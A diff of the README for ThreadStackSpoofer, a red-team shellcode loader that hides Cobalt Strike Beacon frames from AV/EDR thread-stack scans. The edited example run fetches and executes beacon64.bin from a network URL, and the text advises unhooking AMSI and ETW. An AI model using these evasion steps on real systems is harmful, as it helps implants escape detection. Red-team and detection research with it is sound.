@@ -9,10 +9,9 @@ The idea is to hide references to the shellcode on thread's call stack thus masq
 
 Implementation along with my [ShellcodeFluctuation](https://github.com/mgeeky/ShellcodeFluctuation) brings Offensive Security community sample implementations to catch up on the offering made by commercial C2 products, so that we can do no worse in our Red Team toolings. 💪
 
+### Implementation has changed
 
-### Implementation has changed 
-
-Current implementation differs heavily to what was originally published. 
+Current implementation differs heavily to what was originally published.
 This is because I realised there is a way simpler approach to terminate thread's call stack processal and hide shellcode's related frames by simply writing `0` to the return address of the first frame we control:
 
 ```
@@ -32,7 +31,6 @@ The previous implementation, utilising `StackWalk64` can be accessed in this [co
 
 This implementation is much more stable and works nicely on both `Debug` and `Release` under two architectures - `x64` and `x86`.
 
-
 ## Demo
 
 This is how a call stack may look like when it is **NOT** spoofed:
@@ -43,7 +41,7 @@ This in turn, when thread stack spoofing is enabled:
 
 ![spoofed](images/spoofed2.png)
 
-Above we can see that the last frame on our call stack is our `MySleep` callback. 
+Above we can see that the last frame on our call stack is our `MySleep` callback.
 One can wonder does it immediately brings opportunities new IOCs? Hunting rules can look for threads having call stacks not unwinding into following expected thread entry points located within system libraries:
 
 ```
@@ -57,23 +55,21 @@ However the call stack of the spoofed thread may look rather odd at first, a bri
 
 The above screenshot shows a thread of unmodified **Total Commander x64**. As we can see, its call stack pretty much resembles our own in terms of initial call stack frames.
 
-Why should we care about carefully faking our call stack when there are processes exhibiting traits that we can simply mimic? 
-
+Why should we care about carefully faking our call stack when there are processes exhibiting traits that we can simply mimic?
 
 ## How it works?
 
 The rough algorithm is following:
 
-1. Read shellcode's contents from file.
-2. Acquire all the necessary function pointers from `dbghelp.dll`, call `SymInitialize`
-3. Hook `kernel32!Sleep` pointing back to our callback.
-4. Inject and launch shellcode via `VirtualAlloc` + `memcpy` + `CreateThread`. The thread should start from our `runShellcode` function to avoid having Thread's _StartAddress_ point into somewhere unexpected and anomalous (such as `ntdll!RtlUserThreadStart+0x21`)
-5. As soon as Beacon attempts to sleep, our `MySleep` callback gets invoked.
-6. We then overwrite last return address on the stack to `0` which effectively should finish the call stack.
-7. Finally a call to `::SleepEx` is made to let the Beacon's sleep while waiting for further communication.
-8. After Sleep is finished, we restore previously saved original function return addresses and execution is resumed. 
+1. Download shellcode's contents from HTTP/HTTPS URL.
+2. Hook `kernel32!Sleep` pointing back to our callback.
+3. Inject and launch shellcode via `VirtualAlloc` + `memcpy` + `CreateThread`. The thread should start from our `runShellcode` function to avoid having Thread's _StartAddress_ point into somewhere unexpected and anomalous (such as `ntdll!RtlUserThreadStart+0x21`)
+4. As soon as Beacon attempts to sleep, our `MySleep` callback gets invoked.
+5. We then overwrite last return address on the stack to `0` which effectively should finish the call stack.
+6. Finally a call to `::SleepEx` is made to let the Beacon's sleep while waiting for further communication.
+7. After Sleep is finished, we restore previously saved original function return addresses and execution is resumed.
 
-Function return addresses are scattered all around the thread's stack memory area, pointed to by `RBP/EBP` register. 
+Function return addresses are scattered all around the thread's stack memory area, pointed to by `RBP/EBP` register.
 In order to find them on the stack, we need to firstly collect frame pointers, then dereference them for overwriting:
 
 ![stack frame](images/frame0.png)
@@ -81,30 +77,29 @@ In order to find them on the stack, we need to firstly collect frame pointers, t
 _(the above image was borrowed from **Eli Bendersky's** post named [Stack frame layout on x86-64](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64/))_
 
 ```
-	*(PULONG_PTR)(frameAddr + sizeof(void*)) = Fake_Return_Address;
+ *(PULONG_PTR)(frameAddr + sizeof(void*)) = Fake_Return_Address;
 ```
 
 Initial implementation of `ThreadStackSpoofer` did that in `walkCallStack` and `spoofCallStack` functions, however the current implementation shows that these efforts _are not required to maintain stealthy call stack_.
-
 
 ## Example run
 
 Use case:
 
 ```
-C:\> ThreadStackSpoofer.exe <shellcode> <spoof>
+C:\> ThreadStackSpoofer.exe <shellcode_url> <spoof>
 ```
 
 Where:
-- `<shellcode>` is a path to the shellcode file
-- `<spoof>` when `1` or `true` will enable thread stack spoofing and anything else disables it.
 
+- `<shellcode_url>` is a HTTP/HTTPS URL to the shellcode file
+- `<spoof>` when `1` or `true` will enable thread stack spoofing and anything else disables it.
 
 Example run that spoofs beacon's thread call stack:
 
 ```
-PS D:\dev2\ThreadStackSpoofer> .\x64\Release\ThreadStackSpoofer.exe .\tests\beacon64.bin 1
-[.] Reading shellcode bytes...
+PS D:\dev2\ThreadStackSpoofer> .\x64\Release\ThreadStackSpoofer.exe http://192.168.1.100:8080/beacon64.bin 1
+[.] Downloading shellcode from URL...
 [.] Hooking kernel32!Sleep...
 [.] Injecting shellcode...
 [+] Shellcode is now running.
@@ -135,20 +130,18 @@ While developing your advanced shellcode loader, you might also want to implemen
 - **Clear out any leftovers from Reflective Loader** to avoid in-memory signatured detections
 - **Unhook everything you might have hooked** (such as AMSI, ETW, WLDP) before sleeping and then re-hook afterwards.
 
-
 ---
 
 ## Actually this is not (yet) a true stack spoofing
 
-As it's been pointed out to me, the technique here is not _yet_ truly holding up to its name for being a _stack spoofer_. Since we're merely overwriting return addresses on the thread's stack, we're not spoofing the remaining areas of the stack itself. Moreover we're leaving our call stack _unwindable_ meaking it look anomalous since the system will not be able to properly walk the entire call stack frames chain. 
+As it's been pointed out to me, the technique here is not _yet_ truly holding up to its name for being a _stack spoofer_. Since we're merely overwriting return addresses on the thread's stack, we're not spoofing the remaining areas of the stack itself. Moreover we're leaving our call stack _unwindable_ meaking it look anomalous since the system will not be able to properly walk the entire call stack frames chain.
 
 However I'm aware of these shortcomings, at the moment I've left it as is since I cared mostly about evading automated scanners that could iterate over processes, enumerate their threads, walk those threads stacks and pick up on any return address pointing back to a non-image memory (such as `SEC_PRIVATE` - the one allocated dynamically by `VirtuaAlloc` and friends). A focused malware analyst would immediately spot the oddity and consider the thread rather unusual, hunting down our implant. More than sure about it. Yet, I don't believe that nowadays automated scanners such as AV/EDR have sorts of heuristics implemented that would _actually walk each thread's stack_ to verify whether its un-windable `¯\_(ツ)_/¯` .
 
 Surely this project (and commercial implementation found in C2 frameworks) gives AV & EDR vendors arguments to consider implementing appropriate heuristics covering such a novel evasion technique.
 
-In order to improve this technique, one can aim for a true _Thread Stack Spoofer_ by inserting carefully crafted fake stack frames established in an reverse-unwinding process. 
+In order to improve this technique, one can aim for a true _Thread Stack Spoofer_ by inserting carefully crafted fake stack frames established in an reverse-unwinding process.
 Read more on this idea below.
-
 
 ### Implementing a true Thread Stack Spoofer
 
@@ -157,7 +150,7 @@ Firstly, one needs to carefully acknowledge the stack unwinding process explaine
 
 1. takes return address
 2. attempts to identify function containing that address (with [RtlLookupFunctionEntry](https://docs.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-rtllookupfunctionentry))
-3. That function returns `RUNTIME_FUNCTION`, `UNWIND_INFO` and `UNWIND_CODE` structures. These structures describe where are the function's beginning address, ending address, and where are all the code sequences that modify `RBP` or `RSP`. 
+3. That function returns `RUNTIME_FUNCTION`, `UNWIND_INFO` and `UNWIND_CODE` structures. These structures describe where are the function's beginning address, ending address, and where are all the code sequences that modify `RBP` or `RSP`.
 4. System needs to know about all stack & frame pointers modifications that happened in each function across the Call Stack to then virtually _rollback_ these changes and virtually restore call stack pointers when a call to the processed call stack frame happened (this is implemented in [RtlVirtualUnwind](https://docs.microsoft.com/ru-ru/windows/win32/api/winnt/nf-winnt-rtlvirtualunwind))
 5. The system processes all `UNWIND_CODE`s that examined function exhbits to precisely compute the location of that frame's return address and stack pointer value.
 6. Through this emulation, the System is able to walk down the call stacks chain and effectively "unwind" the call stack.
@@ -217,7 +210,6 @@ The process is a bit convoluted, yet boils down to reverting thread's call stack
 
 This PoC does not follows replicate this algorithm, because my current understanding allows me to accept the call stack finishing on an `EXE`-based stack frame and I don't want to overcompliate neither my shellcode loaders nor this PoC. Leaving the exercise of implementing this and sharing publicly to a keen reader. Or maybe I'll sit and have a try on doing this myself given some more spare time :)
 
-
 **More information**:
 
 - **a)** [x64 exception handling - Stack Unwinding process explained](https://docs.microsoft.com/en-us/cpp/build/exception-handling-x64?view=msvc-160)
@@ -255,10 +247,10 @@ Unhook is done.
 
 ## Final remark
 
-This PoC was designed to work with Cobalt Strike's Beacon shellcodes. The Beacon is known to call out to `kernel32!Sleep` to await further instructions from its C2. 
-This loader leverages that fact by hooking `Sleep` in order to perform its housekeeping. 
+This PoC was designed to work with Cobalt Strike's Beacon shellcodes. The Beacon is known to call out to `kernel32!Sleep` to await further instructions from its C2.
+This loader leverages that fact by hooking `Sleep` in order to perform its housekeeping.
 
-This implementation might not work with other shellcodes in the market (such as _Meterpreter_) if they don't use `Sleep` to cool down. 
+This implementation might not work with other shellcodes in the market (such as _Meterpreter_) if they don't use `Sleep` to cool down.
 Since this is merely a _Proof of Concept_ showing the technique, I don't intend on adding support for any other C2 framework.
 
 When you understand the concept, surely you'll be able to translate it into your shellcode requirements and adapt the solution for your advantage.
@@ -267,17 +259,13 @@ Please do not open Github issues related to "this code doesn't work with XYZ she
 
 ---
 
-### ☕ Show Support ☕
-
-This and other projects are outcome of sleepless nights and **plenty of hard work**. If you like what I do and appreciate that I always give back to the community,
-[Consider buying me a coffee](https://github.com/sponsors/mgeeky) _(or better a beer)_ just to say thank you! 💪 
-
----
-
 ## Author
 
-```   
+```
    Mariusz Banach / mgeeky, 21
    <mb [at] binary-offensive.com>
    (https://github.com/mgeeky)
+   Pietro Foroni / shxve
+   <offsec [at] hwgsababa.com>
+   (https://github.com/shxve)
 ```
